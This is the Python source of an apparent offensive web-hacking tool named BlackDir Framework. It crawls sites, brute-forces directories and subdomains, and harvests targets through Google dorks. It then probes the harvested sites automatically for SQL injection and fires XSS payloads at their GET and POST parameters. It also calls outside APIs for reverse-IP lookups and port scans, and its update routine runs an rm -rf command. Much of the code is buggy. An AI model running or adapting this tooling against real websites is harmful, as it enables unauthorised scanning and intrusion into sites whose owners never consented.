import time
from urllib import request
from urllib.parse import urlsplit, parse_qs
import os

try:
    from bs4 import BeautifulSoup
except:
    os.system("clear")
    print(colored("\nPlease Install bs4 library command install:\npip3 install bs4", "red"))
    exit()

# ----------------------------------
try:
    from termcolor import colored
except:
    os.system("clear")
    print(colored("\nPlease Install termcolor library command install:\npip3 install termcolor", "red"))
    exit()

# --------------------------------

try:
    import requests
except:
    os.system("clear")
    print(colored("\nPlease Install requests library command install:\npip3 install requests", "red"))
    exit()

# --------------------------------

try:
    import argparse
except:
    os.system("clear")
    print(colored("\nPlease Install argparse library command install:\npip3 install argparse", "red"))
    exit()

# --------------------------------

try:
    import googlesearch
except:
    os.system("clear")
    print(colored("\nPlease Install google library command install:\npip3 install google", "red"))
    exit()


def logo():
    print("""
\x1b[32m
  ____  _            _    _____  _        ______                                           _    
 |  _ \| |          | |  |  __ \(_)      |  ____|                                         | |   
 | |_) | | __ _  ___| | _| |  | |_ _ __  | |__ _ __ __ _ _ __ ___   _____      _____  _ __| | __
 |  _ <| |/ _` |/ __| |/ / |  | | | '__| |  __| '__/ _` | '_ ` _ \ / _ \ \ /\ / / _ \| '__| |/ /
 | |_) | | (_| | (__|   <| |__| | | |    | |  | | | (_| | | | | | |  __/\ V  V / (_) | |  |   < 
 |____/|_|\__,_|\___|_|\_\_____/|_|_|    |_|  |_|  \__,_|_| |_| |_|\___| \_/\_/ \___/|_|  |_|\_\ version:1.9

 -----------------------------------------------------------------------------------------------------------
    Programmer this tool not irresponsible about any damage Or leak induced by the user
 -----------------------------------------------------------------------------------------------------------
 
help: python3 BlackDir.py -h
==================================================
C0ded By RedVirus[@redvirus0]                                                                                           
""")


def fast_crawl(url):
    global list_direct, url_access, url_source
    list_direct = []
    url_strip = url.strip("https://www.")
    headers = {"user-agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0"}
    list_direct.append(url)
    url_request = requests.get(url,headers=headers)
    url_source = BeautifulSoup(url_request.content, "html.parser")
    for link in url_source.find_all("a"):
        link_pure = link.get("href")
        try:
            if "#" in link_pure or "../" in link_pure or "facebook.com" in link_pure or "@" in link_pure:
                pass
            else:
                if "http" not in link_pure and "https" not in link_pure and url_strip not in link_pure:
                    try:
                        first_req = requests.get(url+link_pure)
                        if first_req.status_code == 200:
                            print(colored("================================================================","green"))
                            print(colored("Url:","green"),url+link_pure)
                            print(colored("Request:","green"),first_req.status_code)
                            print(colored("================================================================","green"))
                            list_direct.append(url+link_pure)
                        else:
                            pass
                    except requests.exceptions.ConnectionError:
                        pass
                else:
                    if "http" in link_pure or "https" in link_pure and url_strip in link_pure:
                        try:
                            sec_req = requests.get(link_pure)
                            if sec_req.status_code == 200:
                                if sec_req.url not in list_direct:
                                    print(colored("================================================================","green"))
                                    print(colored("Url:", "green"),link_pure)
                                    print(colored("Request:", "green"), sec_req.status_code)
                                    print(colored("================================================================","green"))
                                    list_direct.append(link_pure)
                            else:
                                pass
                        except requests.exceptions.ConnectionError:
                            pass
                    elif "http" not in link_pure or "https" not in link_pure and url_strip in link_pure:
                        try:
                            third_req = requests.get("http://"+link_pure)
                            if third_req.status_code == 200:
                                if third_req.url not in list_direct:
                                    print(colored("================================================================","green"))
                                    print(colored("Url:", "green"), third_req.url)
                                    print(colored("Request:", "green"), third_req.status_code)
                                    print(colored("================================================================","green"))
                                    list_direct.append("http://"+link_pure)
                            else:
                                pass
                        except requests.exceptions.ConnectionError:
                            pass
                    else:
                        try:
                            fourth_req = requests.get(link_pure)
                            if fourth_req.status_code == 200:
                                if fourth_req.url not in list_direct:
                                    print(colored("================================================================","green"))
                                    print(colored("Url:", "green"), fourth_req.url)
                                    print(colored("Request:", "green"), fourth_req.status_code)
                                    print(colored("================================================================","green"))
                                    list_direct.append(fourth_req.url)
                            else:
                                pass
                        except requests.exceptions.ConnectionError:
                            pass
        except:
            pass
    for url_form_list in list_direct:
        sec_url_request = requests.get(url_form_list)
        soup = BeautifulSoup(sec_url_request.content,"html.parser")
        for sec_link in soup.find_all("a"):
            sec_link = sec_link.get("href")
            try:
                if "#" in sec_link or "./" in sec_link:
                    pass
                else:
                    if url_strip not in sec_link:
                        pass
                    else:
                        if "http" not in sec_link or "https" not in sec_link and url_strip in sec_link:
                            try:
                                five_req = requests.get("http://"+sec_link)
                                if five_req.status_code == 200:
                                    if five_req.url not in list_direct:
                                        print(colored("================================================================","green"))
                                        print(colored("Url:", "green"), five_req.url)
                                        print(colored("Request:", "green"), five_req.status_code)
                                        print(colored("================================================================","green"))
                                        list_direct.append(five_req.url)
                                else:
                                    pass
                            except:
                                pass
                        else:
                            try:
                                six_req = requests.get(sec_link)
                                if six_req.status_code == 200:
                                    if six_req.url not in list_direct:
                                        print(colored("================================================================","green"))
                                        print(colored("Url:", "green"), six_req.url)
                                        print(colored("Request:", "green"), six_req.status_code)
                                        print(colored("================================================================","green"))
                                        list_direct.append(six_req.url)
                                else:
                                    pass
                            except:
                                pass
            except:
                pass
def sql(url): #Function F0r find Sql_Injection
    try:
        parametrs = []
        after_eq = []
        get = {}
        query = urlsplit(url).query
        dictonary = parse_qs(query)
        key = list(dictonary.keys())
        value = list(dictonary.values())
        for par in key:
            parametrs.append(par)
        for equal in value:
            for number in equal:
                after_eq.append(number+"'")
        for pars in parametrs:
            for eq in after_eq:
                get={pars:eq}
        req = requests.get(url,params=get)
        if "Warning" in req.text or "Database error" in req.text or "MySQL error" in req.text or "SQL syntax" in req.text:
            print(colored("SQL Injection", "red"), colored("Type:Union Based", "grey"))
            print(colored("Url Vulnerable:", "green"), colored(req.url, "red"))
        else:
            print(req.content)
    except:
        pass
def sql_dorks(url):
    global equal_parameter, response, keys, request_status
    try:
        time.sleep(1.0)
        try:
            request_status = requests.get(url)
            if request_status.status_code == 200:
                print(colored("Request Status:", "red"), colored(request_status.status_code, "green"))
                print("Url:", colored(url, "green"))
                query = urlsplit(url).query
                parameter = parse_qs(query)
                url_request = request.urlopen(url).read().decode(encoding="iso-8859-1")
                url_source = BeautifulSoup(url_request, "html.parser")
                values = list(parameter.values())
                for index, item in enumerate(values):
                    equal_par = values[index]
                    for i in equal_par:
                        equal_parameter = str(i + "'")
                        keys = list(parameter.keys())
                    for index, item in enumerate(keys):
                        parmeter_name = keys[index]
                        parmeter_name = str(parmeter_name)
                        post_sql = {}
                        post_sql[parmeter_name] = equal_parameter
                        response = requests.get(url, post_sql)
                    if "Warning" in response.text:
                        print(colored("SQL Injection", "red"), colored("Type:Union Based", "grey"))
                        print(colored("Url Vulnerable:", "green"), colored(url, "red"))
                    else:
                        print(colored("Url Not Vulnerable: ", "red"), colored(response.url, "green"))
            else:
                print(colored("Request Status:" + request_status.status_code, "red"))
                print("Url:", request_status.url)
        except requests.exceptions.ConnectionError:
            pass
    except:
        pass


def xss(url):  # Function FOr Find xss vulnerability
    fast_crawl(url)
    global payload
    print(colored("Please Wait We Scanning . .", "red"))
    time.sleep(2)
    for url_direct in list_direct:
        print(colored("We Scanning This Url: ", "grey"), colored(url_direct, "green"))
        time.sleep(2)
        payloads = open("xss_payloads.txt", "r")
        query = urlsplit(url).query
        params = parse_qs(query)
        kyes = list(params.keys())
        single_cotation = "'"
        slash = "//"
        double_cotation = '"'
        symbol = ">"
        post_data_get = {}
        post_data_post = {}
        for payload in payloads:
            payload = payload.strip()
            for index, item in enumerate(kyes):
                if payload == "; alert(1);":
                    payload = single_cotation + payload
                    post_data_get[kyes[index]] = payload
                    response = requests.get(url_direct, params=post_data_get)
                    if payload in response.text:
                        print(colored("[!] Is Vulnerable [xss] Payload >> {}", "green").format(payload))
                        print("Url Vulnerable", response.url)
                        print(colored("Method:", "red") + colored("GET", "grey"))
                        print("--------------------------------------------------------")
                    else:
                        print(colored("This Payload Not in Source: Payload >> {}", "red").format(payload))
                        print(colored("[!] Method:", "red") + colored("GET", "grey"))
                        print("--------------------------------------------------------")
                elif payload == ")alert(1);":
                    payload = single_cotation + payload + slash
                    post_data_get[kyes[index]] = payload
                    response = requests.get(url_direct, params=post_data_get)
                    if payload in response.text:
                        print(colored("[!] Is Vulnerable [xss] Payload >> {}", "green").format(payload))
                        print("Url Vulnerable", response.url)
                        print(colored("Method:", "red") + colored("GET", "grey"))
                        print("--------------------------------------------------------")
                    else:
                        pass
                elif payload == '<IMG SRC=”javascript:alert(123);':
                    payload = payload + double_cotation + symbol
                    post_data_get[kyes[index]] = payload
                    response = requests.get(url_direct, params=post_data_get)
                    if payload in response.text:
                        print(colored("[!] Is Vulnerable [xss] Payload >> {}", "green").format(payload))
                        print("Url Vulnerable", response.url)
                        print(colored("Method:", "red") + colored("GET", "grey"))
                        print("--------------------------------------------------------")
                    else:
                        pass
                else:
                    post_data_get[kyes[index]] = payload
                    response = requests.get(url_direct, params=post_data_get)
                    if payload in response.text:
                        print(colored("[!] Is Vulnerable [xss] Payload >> {}", "green").format(payload))
                        print("Url Vulnerable", response.url)
                        print(colored("Method:", "red") + colored("GET", "grey"))
                        print("--------------------------------------------------------")
                    else:
                        pass
            url_content = request.urlopen(url_direct).read()
            inputs = BeautifulSoup(url_content, "html.parser")
            for inputs_form in inputs.find_all("input"):
                if inputs_form in inputs.find_all("input"):
                    if inputs_form.get('type') == "submit":
                        input_submit = inputs_form.get('name')
                        post_data_post[input_submit] = inputs_form.get("value")
                    if inputs_form.get('type') == 'text':
                        input_name = inputs_form.get('name')
                        post_data_post[input_name] = payload
            response = requests.post(url, post_data_post)  # POST
            if payload in response.text:
                print(colored("Information:", "grey"))
                print(colored("[!] Url Vulnerable {}", "green").format(url))
                print("--------------------------------------------------------")
                print(colored("[!] Is Vulnerable [xss] Payload >> {}", "green").format(payload))
                print("--------------------------------------------------------")
                print(colored("[!] Method:", "red") + colored("POST", "grey"))
                print("--------------------------------------------------------")
                print(colored("Source:", "green"))
                print(response.text)
                print("--------------------------------------------------------")
            else:
                pass


def httplive(url):
    global live
    live = None
    bool(live)
    try:
        request_live = requests.get(url)
        if request_live.status_code == 200:
            print(colored("Http Live : ", "green"), url)
            live = 1
    except requests.exceptions.ConnectionError:
        print(colored("Http Down : ", "red"), url)
        live = 0


def spider(url, lists, secure):
    print(colored("Please Wait We Check if URL Live or Down . . ", "green"))
    time.sleep(3)
    httplive(url)
    if live == 1:
        if secure == "list.txt":
            print(colored("Please Wait We Spider all Directories . .", "red"))
            time.sleep(3)
            fast_crawl(url)
            print(colored("We Crawling By This File >>" + os.getcwd() + "/" + "list.txt", "green"))
            for i in lists:
                i = i.strip()
                Purl = url + "/" + i
                response = requests.get(Purl)
                if response.status_code == 200:
                    print("\x1b[32mFound[+]")
                    print(response.url)
                else:
                    pass
        else:
            fast_crawl(url)
            print(colored("We Crawling By This File >>" + listuser, "green"))
            for i in lists:
                i = i.strip()
                Purl = url + "/" + i
                response = requests.get(Purl)
                if response.status_code == 200:
                    print("\x1b[32mFound[+]")
                    print(response.url)
                else:
                    pass
    else:
        pass


def dorks(dork, country,text):  # function for Get Dork
    if  country != None and text == None:
        docker = "inurl:"+dork+" site:"+country
    elif country == None and text != None:
        docker = "inurl:"+dork+" intext:"+country
    else:
        docker ="inurl:"+dork
    list_of_url = []
    results = []
    user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0"
    headers = {'user-agent': user_agent}
    link = "https://google.com/search?q="+docker
    rep = requests.get(link, headers=headers)
    if rep.status_code == 200:
        soup = BeautifulSoup(rep.content, "html.parser")
    for g in soup.find_all('div', class_='r'):
        anchors = g.find_all('a')
        if anchors:
            link = anchors[0]['href']
            title = g.find('h3').text
            item = {
                "title": title,
                "link": link
            }
            results.append(item)
    for dic in results:
        list_of_link = list(dic.values())
        print("\n")
        print(colored("Title Of Link:", "green"), list_of_link[0], "\n")
        print(colored("Link:", "green"), list_of_link[1], "\n")
        list_of_url.append(list_of_link[1])
    line = input(colored("You Want Scan All URLs [Y/N]: ", "green"))
    if line == "Y" or line == "y" or line == None:
        for urls in list_of_url:
            sql_dorks(urls)
    else:
        pass


def list_dorks(file):
    handle =open(file,"r")
    user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0"
    headers = {'user-agent': user_agent}
    result=[]
    url_hand = []
    for dork in handle:
        print(colored("------------------------","red"))
        print(colored("Dork:", "red"), colored(dork,"green"))
        print(colored("------------------------","red"))
        time.sleep(2)
        link = "https://google.com/search?q="+dork
        rep = requests.get(link,headers=headers)
        if rep.status_code == 200:
            soup = BeautifulSoup(rep.content,"html.parser")
        for g in soup.find_all('div', class_='r'):
            anchors = g.find_all('a')
            if anchors:
                link = anchors[0]['href']
                title = g.find('h3').text
                item = {
                    "title": title,
                    "link": link
                }
                result.append(item)
                for dict in result:
                    list_link = list(dict.values())
                    print("\n")
                    print(colored("Title Of Link:", "green"), list_link[0], "\n")
                    print(colored("Link:", "green"), list_link[1], "\n")
                    url_hand.append(list_link[1])
    user = input(colored("You Want Scan All URLs [Y/N]: ", "green"))
    if user == "Y" or user == "y" or user == None:
        for urls in url_hand:
            sql_dorks(urls)
def sub(url, subs):  # function for gussing subdomain
    if "https" in url:
        url = url.strip("https://")
    elif "http" in url:
        url = url.strip("http://")
    for i in subs:
        i = i.strip()
        Purl = i + "." + url
        try:
            response = requests.get("http://" + Purl)
            if response.status_code == 200:
                print(colored("Status_Code:200"))
                print(colored("Url:http://{0}", "green").format(Purl))
            else:
                pass
        except:
            pass


def ip_reverse(ip):
    try:
        url = ("https://api.hackertarget.com/reverseiplookup/?q=")
        url_ip = url + ip
        req = requests.get(url_ip)
        response = req.text
        print(colored(response, "blue"))
    except requests.exceptions.ConnectionError:
        print(colored("Connection Fail", "blue"))

def scanports(ip):
    api = "https://api.hackertarget.com/nmap/?q="
    new_api = api+ip
    req_api = requests.get(new_api)
    print(req_api.text)
def update():
    os.system("cd .. && rm -rf BlackDir-Framework-New && mkdir BlackDir-Framework-New && cd BlackDir-Framework-New && git clone https://github.com/RedVirus0/BlackDir-Framework.git && echo 'New Directory >> ' && pwd")


parser = argparse.ArgumentParser("""
--spider            : Url to find Directory
--list              : If you have list
--dork              : Dump all sites by dork
--country           : find Dork By Country
--text              : Dump site text if in site
--subdomain         : find SubDomain of site
--xss               : Scan Site if vulnerable [Xss]
--sql               : Scan Site if vulnerable [Sql]
--listDork          : Scan list Dorks if Vulnerable [Sql]
--RevIP             : Dump all site by ip
--port              : Scan ports by ip
--update            : Update Tool ex: --update check
ex:
BlackDir.py --list /root/Desktop/list.txt --url http://google.com
BlackDir.py --dork inurl:admin/login.php --country site:uk --level 100
BlackDir.py --subdomain google.com
""")
parser.add_argument("-spider", "--spider")
parser.add_argument("-list", "--list")
parser.add_argument("-dork", "--dork")
parser.add_argument("-country", "--country")
parser.add_argument("-subdomain", "--subdomain")
parser.add_argument("-xss", "--xss")
parser.add_argument("-text", "--text")
parser.add_argument("-sql", "--sql")
parser.add_argument("-listDork", "--listDork")
parser.add_argument("-update", "--update")
parser.add_argument("-RevIP", "--RevIP")
parser.add_argument("-port", "--port")
args = parser.parse_args()
secure = None
listuser = args.list
if listuser != None:
    listuser = args.list
    secure = None
elif listuser == None:
    listuser = open("list.txt", "r")
    secure = "list.txt"
ip = args.RevIP
portscan = args.port
dork = args.dork
country = args.country
url = args.spider
subdomains = args.subdomain
scanner = args.xss
text = args.text
sql_inection = args.sql
list_dork = args.listDork
updates = args.update
sublist = open("sub.txt", "r")
site = args.country
if dork != None and url == None and subdomains == None and scanner == None and sql_inection == None and list_dork == None and updates == None and ip == None and portscan == None:
    dorks(dork, site, text)
elif url != None and dork == None and subdomains == None and scanner == None and sql_inection == None and list_dork == None and updates == None and ip == None and portscan == None:
    spider(url, listuser, secure)
elif subdomains != None and url == None and dork == None and scanner == None and sql_inection == None and list_dork == None and updates == None and ip == None and portscan == None:
    sub(subdomains, sublist)
elif scanner != None and url == None and dork == None and subdomains == None and sql_inection == None and list_dork == None and updates == None and ip == None and portscan == None:
    xss(scanner)
elif sql_inection != None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None and updates == None and ip == None and portscan == None:
    sql(sql_inection)
elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork != None and updates == None and ip == None and portscan == None:
    list_dorks(list_dork)
elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None and updates != None and ip == None and portscan == None:
    if updates == "check" or updates == "Check":
        update()
    else:
        print(colored("Error ! Please Enter --update check", "red"))
elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None and updates == None and ip != None and portscan == None:
    ip_reverse(ip)
elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None and updates == None and ip == None and portscan != None:
    scanports(portscan)

else:
    logo()
